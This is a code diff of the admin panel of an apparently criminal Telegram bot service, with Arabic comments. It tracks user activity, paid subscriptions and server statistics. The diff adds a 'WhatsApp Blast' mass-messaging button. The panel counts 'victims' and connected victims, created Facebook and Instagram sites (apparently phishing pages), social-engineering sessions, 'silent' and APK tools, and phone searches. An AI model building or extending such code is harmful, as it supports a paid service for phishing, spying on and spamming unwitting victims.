@@ -1,8 +1,7 @@
 # admin_system.py
 # ============================================================
-# نظام الأدمن المتطور — v2.1
-# Live Tracking + Analytics + Full Control
-# (الصيانة مخفية من الـ UI لكن الدوال موجودة)
+# نظام الأدمن المتطور — v2.2
+# Live Tracking + Analytics + WhatsApp Blast
 # ============================================================
 
 import io
@@ -35,60 +34,47 @@ KEY_ONLINE_USERS = "system:online_users"
 # [1] Live User Tracking
 # ============================================================
 def track_user_activity(user_id, action, extra=None):
-    """يسجل نشاط أي مستخدم في real-time"""
     if not redis_client:
         return
-
     try:
         now = time.time()
         now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        # ─── آخر نشاط ───
         redis_client.setex(
             f"user_activity:{user_id}:last",
             3600,
             json.dumps({
-                "action": action,
-                "extra": extra or {},
-                "timestamp": now,
-                "time_str": now_str,
+                "action": action, "extra": extra or {},
+                "timestamp": now, "time_str": now_str,
             }, ensure_ascii=False)
         )
 
-        # ─── سجل الأنشطة ───
         redis_client.lpush(
             f"user_activity:{user_id}:log",
             json.dumps({
-                "action": action,
-                "extra": extra or {},
-                "timestamp": now,
-                "time_str": now_str,
+                "action": action, "extra": extra or {},
+                "timestamp": now, "time_str": now_str,
             }, ensure_ascii=False)
         )
         redis_client.ltrim(f"user_activity:{user_id}:log", 0, 99)
         redis_client.expire(f"user_activity:{user_id}:log", 86400 * 7)
 
-        # ─── Online Users ───
         redis_client.zadd(KEY_ONLINE_USERS, {str(user_id): now})
         cutoff = now - 300
         redis_client.zremrangebyscore(KEY_ONLINE_USERS, 0, cutoff)
         redis_client.expire(KEY_ONLINE_USERS, 3600)
 
-        # ─── Global Activity Log ───
         redis_client.lpush(
             "system:activity_log",
             json.dumps({
-                "user_id": user_id,
-                "action": action,
+                "user_id": user_id, "action": action,
                 "extra": extra or {},
-                "timestamp": now,
-                "time_str": now_str,
+                "timestamp": now, "time_str": now_str,
             }, ensure_ascii=False)
         )
         redis_client.ltrim("system:activity_log", 0, 499)
         redis_client.expire("system:activity_log", 86400 * 7)
 
-        # ─── Counters ───
         today = datetime.utcnow().strftime("%Y-%m-%d")
         redis_client.hincrby(f"system:tool_usage:{today}", action, 1)
         redis_client.expire(f"system:tool_usage:{today}", 86400 * 30)
@@ -170,11 +156,9 @@ def get_tool_usage_today():
 def get_top_users(limit=10, period="day"):
     if not redis_client:
         return []
-
     try:
         users = redis_client.smembers("all_users") or set()
         counter = Counter()
-
         for uid in users:
             try:
                 log_count = redis_client.llen(f"user_activity:{uid}:log") or 0
@@ -184,15 +168,12 @@ def get_top_users(limit=10, period="day"):
                     last_ts = last.get("timestamp", 0)
                 else:
                     last_ts = 0
-
                 cutoff = time.time() - (86400 if period == "day" else 604800)
                 if last_ts > cutoff:
                     counter[uid] = log_count
             except Exception:
                 continue
-
         return counter.most_common(limit)
-
     except Exception as e:
         logger.exception(f"get_top_users error: {e}")
         return []
@@ -201,20 +182,17 @@ def get_top_users(limit=10, period="day"):
 def get_conversion_stats():
     if not redis_client:
         return {"total": 0, "free": 0, "paid": 0, "rate": 0}
-
     try:
         users = redis_client.smembers("all_users") or set()
         total = len(users)
         paid = 0
         free = 0
-
         for uid in users:
             try:
                 raw = redis_client.get(f"user:{uid}")
                 if not raw:
                     continue
                 u = json.loads(raw)
-
                 has_sub = False
                 if u.get("subscription"):
                     try:
@@ -223,17 +201,14 @@ def get_conversion_stats():
                             has_sub = True
                     except Exception:
                         pass
-
                 if u.get("is_vip") or has_sub:
                     paid += 1
                 else:
                     free += 1
             except Exception:
                 continue
-
         rate = (paid / total * 100) if total > 0 else 0
         return {"total": total, "free": free, "paid": paid, "rate": round(rate, 1)}
-
     except Exception as e:
         logger.exception(f"get_conversion_stats error: {e}")
         return {"total": 0, "free": 0, "paid": 0, "rate": 0}
@@ -266,30 +241,24 @@ def get_user_full_info(user_id):
         "created_fb_sites": 0, "created_ig_sites": 0,
         "phone_searches": 0, "payments_count": 0, "total_spent": 0,
     }
-
     if not redis_client:
         return info
-
     try:
         raw = redis_client.get(f"user:{user_id}")
         if not raw:
             return info
-
         info["found"] = True
         u = json.loads(raw)
         info["data"] = u
-
         info["activity"] = get_user_activity(user_id)
         info["activity_log"] = get_user_activity_log(user_id, limit=20)
         info["is_online"] = is_user_online(user_id)
         info["usage_today"] = u.get("daily_uses_count", 0)
-
         try:
             victims = redis_client.smembers(f"victims:{user_id}") or set()
             info["victims_count"] = len(victims)
         except Exception:
             pass
-
         try:
             sessions = redis_client.lrange(f"se_user_sessions:{user_id}", 0, 999) or []
             for sid in sessions:
@@ -306,27 +275,23 @@ def get_user_full_info(user_id):
                     continue
         except Exception:
             pass
-
         try:
             info["phone_searches"] = redis_client.llen(f"phone_searches:{user_id}") or 0
         except Exception:
             pass
-
         try:
             purchases = u.get("purchases", [])
             info["payments_count"] = len(purchases)
             info["total_spent"] = u.get("total_stars_spent", 0)
         except Exception:
             pass
-
     except Exception as e:
         logger.exception(f"get_user_full_info error: {e}")
-
     return info
 
 
 # ============================================================
-# [4] Maintenance (مخفية من الـ UI)
+# [4] Maintenance
 # ============================================================
 def is_maintenance():
     if not redis_client:
@@ -344,7 +309,6 @@ def enable_maintenance(custom_msg=None, admin_id=None):
         pipe = redis_client.pipeline()
         pipe.set(KEY_MAINTENANCE, "1")
         pipe.set(KEY_MAINTENANCE_STARTED, str(time.time()))
-
         if custom_msg:
             pipe.set(KEY_MAINTENANCE_MSG, custom_msg)
         else:
@@ -354,12 +318,9 @@ def enable_maintenance(custom_msg=None, admin_id=None):
                 "━━━━━━━━━━━━━━━━━━\n\n"
                 "نعمل حالياً على تحديثات مهمة.\n"
                 "سيتم إعادة تشغيل البوت قريباً.\n\n"
-                "🔔 <i>نعتذر عن الإزعاج</i>\n"
-                "━━━━━━━━━━━━━━━━━━\n"
-                "⚡ K_J6 Team"
+                "🔔 <i>نعتذر عن الإزعاج</i>"
             )
         pipe.execute()
-
         metrics.inc_counter("maintenance_enabled")
         logger.warning(f"🛠️ Maintenance ENABLED by {admin_id}")
         return True
@@ -376,7 +337,6 @@ def disable_maintenance(admin_id=None):
         pipe.delete(KEY_MAINTENANCE)
         pipe.delete(KEY_MAINTENANCE_STARTED)
         pipe.execute()
-
         metrics.inc_counter("maintenance_disabled")
         logger.info(f"✅ Maintenance DISABLED by {admin_id}")
         return True
@@ -427,16 +387,13 @@ def get_system_stats():
         "total_sessions": 0, "total_silent": 0, "total_phone_searches": 0,
         "uptime_seconds": 0, "redis_memory_mb": 0, "redis_keys": 0,
     }
-
     if not redis_client:
         return stats
-
     try:
         try:
             users = redis_client.smembers("all_users") or set()
             stats["total_users"] = len(users)
             now = time.time()
-
             for uid in users:
                 try:
                     raw = redis_client.get(f"user:{uid}")
@@ -447,7 +404,6 @@ def get_system_stats():
                         stats["banned_users"] += 1
                     if u.get("is_vip"):
                         stats["vip_users"] += 1
-
                     created = u.get("created_at", "")
                     if created:
                         try:
@@ -460,13 +416,10 @@ def get_system_stats():
                     continue
         except Exception:
             pass
-
         stats["online_now"] = get_online_count()
-
         try:
             victim_keys = redis_client.keys("victim:*:*") or []
             stats["total_victims"] = len(victim_keys)
-
             for key in victim_keys[:500]:
                 try:
                     v = redis_client.hgetall(key)
@@ -478,14 +431,12 @@ def get_system_stats():
                     continue
         except Exception:
             pass
-
         try:
             stats["total_sessions"] = len(redis_client.keys("se_session:*") or [])
             stats["total_silent"] = len(redis_client.keys("silent:*") or [])
             stats["total_phone_searches"] = len(redis_client.keys("phone_search:*") or [])
         except Exception:
             pass
-
         try:
             start = redis_client.get(KEY_START_TIME)
             if start:
@@ -494,17 +445,14 @@ def get_system_stats():
                 redis_client.set(KEY_START_TIME, str(time.time()))
         except Exception:
             pass
-
         try:
             info = redis_client.info("memory")
             stats["redis_memory_mb"] = round(info.get("used_memory", 0) / 1024 / 1024, 2)
             stats["redis_keys"] = redis_client.dbsize()
         except Exception:
             pass
-
     except Exception as e:
         logger.exception(f"get_system_stats error: {e}")
-
     return stats
 
 
@@ -519,13 +467,11 @@ def format_uptime(seconds):
 
 
 # ============================================================
-# [6] ★ Admin Menu — بدون زر صيانة ★
+# [6] ★ Admin Menu — مع WhatsApp Blast ★
 # ============================================================
 def build_advanced_admin_menu():
-    """لوحة الأدمن المتطورة — الصيانة مخفية"""
+    """لوحة الأدمن المتطورة"""
     m = InlineKeyboardMarkup()
-
-    # ❌ لا يوجد زر صيانة
 
     # ─── Live Monitor ───
     m.row(
@@ -560,6 +506,14 @@ def build_advanced_admin_menu():
         InlineKeyboardButton("⭐ نجوم", callback_data="admin_give_stars"),
     )
 
+    # ═══════════════════════════════════════════════
+    # ★★★ WhatsApp Blast — القسم الجديد ★★★
+    # ═══════════════════════════════════════════════
+    m.row(InlineKeyboardButton(
+        "⚡ WhatsApp Blast",
+        callback_data="admin_wb_menu"
+    ))
+
     # ─── الأدوات ───
     m.row(
         InlineKeyboardButton("⚙️ إدارة التحديثات", callback_data="admin_updates"),
@@ -590,46 +544,44 @@ def build_advanced_admin_menu():
 def build_admin_stats_text():
     stats = get_system_stats()
     conversion = get_conversion_stats()
+    is_maint = is_maintenance()
+    maint_status = "🔴 <b>نشط</b>" if is_maint else "🟢 <b>متوقف</b>"
+    if is_maint:
+        maint_status += f" ({format_uptime(get_maintenance_duration())})"
 
     text = (
         "📊 <b>إحصائيات النظام الحية</b>\n"
         "━━━━━━━━━━━━━━━━━━\n"
         f"🕐 <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
-
+        "🛠️ <b>الصيانة:</b> " + maint_status + "\n\n"
         "━━━ 👥 المستخدمون ━━━\n"
         f"📊 <b>الإجمالي:</b> <code>{stats['total_users']}</code>\n"
         f"🔴 <b>Online الآن:</b> <code>{stats['online_now']}</code>\n"
         f"🆕 <b>جدد 24س:</b> <code>{stats['new_users_24h']}</code>\n"
         f"💎 <b>VIP:</b> <code>{stats['vip_users']}</code>\n"
         f"🚫 <b>محظورين:</b> <code>{stats['banned_users']}</code>\n\n"
-
         "━━━ 💰 التحويل ━━━\n"
         f"✅ <b>مدفوع:</b> <code>{conversion['paid']}</code>\n"
         f"🆓 <b>مجاني:</b> <code>{conversion['free']}</code>\n"
         f"📈 <b>معدل:</b> <code>{conversion['rate']}%</code>\n\n"
-
         "━━━ 🎯 الضحايا ━━━\n"
         f"📱 <b>الإجمالي:</b> <code>{stats['total_victims']}</code>\n"
         f"🟢 <b>متصلين:</b> <code>{stats['online_victims']}</code>\n\n"
-
         "━━━ 🌐 الأدوات ━━━\n"
         f"📘 <b>Sessions:</b> <code>{stats['total_sessions']}</code>\n"
         f"🎯 <b>Silent:</b> <code>{stats['total_silent']}</code>\n"
         f"📱 <b>Phone Searches:</b> <code>{stats['total_phone_searches']}</code>\n\n"
-
         "━━━ ⚙️ النظام ━━━\n"
         f"⏱️ <b>Uptime:</b> <code>{format_uptime(stats['uptime_seconds'])}</code>\n"
         f"💾 <b>Redis:</b> <code>{stats['redis_memory_mb']} MB</code>\n"
         f"🔑 <b>Keys:</b> <code>{stats['redis_keys']}</code>\n"
     )
-
     return text
 
 
 def build_live_monitor_text():
     online_users = get_online_users()
     tool_usage = get_tool_usage_today()
-
     text = (
         "🔴 <b>المراقبة المباشرة</b>\n"
         "━━━━━━━━━━━━━━━━━━\n"
@@ -637,7 +589,6 @@ def build_live_monitor_text():
         f"👥 <b>Online الآن:</b> <code>{len(online_users)}</code>\n\n"
         "━━━ 📡 أدوات مستخدمة اليوم ━━━\n"
     )
-
     if not tool_usage:
         text += "<i>لا يوجد نشاط اليوم</i>\n"
     else:
@@ -649,9 +600,7 @@ def build_live_monitor_text():
                 "phone_search": "📱", "silent": "🎯", "apk": "📦",
             }.get(tool, "•")
             text += f"{emoji} <b>{h(tool)}:</b> <code>{count}</code>\n"
-
     text += "\n━━━ 🌐 آخر 10 أنشطة ━━━\n"
-
     recent = get_recent_activity(limit=10)
     if not recent:
         text += "<i>لا يوجد</i>"
@@ -661,34 +610,28 @@ def build_live_monitor_text():
             action = ev.get("action", "?")
             ts = ev.get("time_str", "?")[11:19]
             text += f"• <code>{ts}</code> — <code>{h(str(uid))[:10]}</code> — <b>{h(action)}</b>\n"
-
     return text
 
 
 def build_analytics_text():
     tool_usage = get_tool_usage_today()
     conversion = get_conversion_stats()
-
     text = (
         "📈 <b>التحليلات العميقة</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         "━━━ 📊 استخدام الأدوات ━━━\n"
     )
-
     if not tool_usage:
         text += "<i>لا يوجد بيانات</i>\n"
     else:
         total = sum(tool_usage.values())
         top_tools = sorted(tool_usage.items(), key=lambda x: x[1], reverse=True)[:15]
-
         for tool, count in top_tools:
             percent = (count / total * 100) if total > 0 else 0
             bar = "█" * int(percent / 5)
             text += f"<b>{h(tool)}</b>\n"
             text += f"<code>{count}</code> ({percent:.1f}%) {bar}\n\n"
-
         text += f"━━━ 📊 الإجمالي: <code>{total}</code> ━━━\n\n"
-
     text += (
         "━━━ 💰 التحويل ━━━\n"
         f"• إجمالي: <code>{conversion['total']}</code>\n"
@@ -696,21 +639,17 @@ def build_analytics_text():
         f"• مجاني: <code>{conversion['free']}</code>\n"
         f"• معدل: <code>{conversion['rate']}%</code>\n"
     )
-
     return text
 
 
 def build_top_users_text():
     top = get_top_users(limit=15, period="day")
-
     if not top:
         return "👑 <b>لا يوجد بيانات بعد</b>"
-
     text = (
         "👑 <b>أكثر المستخدمين نشاطاً (24س)</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
     )
-
     for i, (uid, count) in enumerate(top, 1):
         try:
             raw = redis_client.get(f"user:{uid}")
@@ -723,19 +662,15 @@ def build_top_users_text():
             )
         except Exception:
             text += f"{i}. <code>{uid}</code> — {count}\n"
-
     return text
 
 
 def build_user_full_info_text(uid):
     info = get_user_full_info(uid)
-
     if not info["found"]:
         return f"❌ <b>المستخدم {uid} غير موجود</b>"
-
     u = info["data"]
     activity = info["activity"] or {}
-
     if is_admin(uid):
         status = "👑 أدمن"
     elif u.get("is_banned"):
@@ -754,15 +689,12 @@ def build_user_full_info_text(uid):
             status = "❓"
     else:
         status = "🆓 مجاني"
-
     online_status = "🔴 متصل الآن" if info["is_online"] else "⚪ غير متصل"
-
     last_action = "—"
     last_time = "—"
     if activity:
         last_action = activity.get("action", "—")
         last_time = activity.get("time_str", "—")
-
     text = (
         f"👤 <b>معلومات المستخدم الكاملة</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
@@ -784,17 +716,14 @@ def build_user_full_info_text(uid):
         f"• <b>عدد:</b> <code>{info['payments_count']}</code>\n"
         f"• <b>إجمالي:</b> <code>{info['total_spent']} ⭐</code>\n\n"
     )
-
     if info["activity_log"]:
         text += "━━━ 📡 آخر 10 أنشطة ━━━\n"
         for log in info["activity_log"][:10]:
             t = log.get("time_str", "?")[11:19]
             a = log.get("action", "?")
             text += f"• <code>{h(t)}</code> — <b>{h(a)}</b>\n"
-
     if u.get("notes"):
         text += f"\n📝 <b>ملاحظات:</b> {h(u['notes'])}"
-
     return text
 
 
@@ -822,10 +751,8 @@ def h(text):
 def clean_redis_cache():
     if not redis_client:
         return {"cleaned": 0, "errors": 0}
-
     cleaned = 0
     errors = 0
-
     try:
         patterns = ["dash_magic:*", "phone_search:*", "lsh_active:*"]
         for pattern in patterns:
@@ -841,11 +768,9 @@ def clean_redis_cache():
                         errors += 1
             except Exception:
                 errors += 1
-
         metrics.inc_counter("redis_cleaned", value=cleaned)
     except Exception as e:
         logger.exception(f"clean_redis_cache error: {e}")
-
     return {"cleaned": cleaned, "errors": errors}
 
 
@@ -857,8 +782,7 @@ def log_admin_event(admin_id, event_type, details=""):
         return
     try:
         event = {
-            "admin_id": admin_id,
-            "type": event_type,
+            "admin_id": admin_id, "type": event_type,
             "details": details,
             "timestamp": time.time(),
             "time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
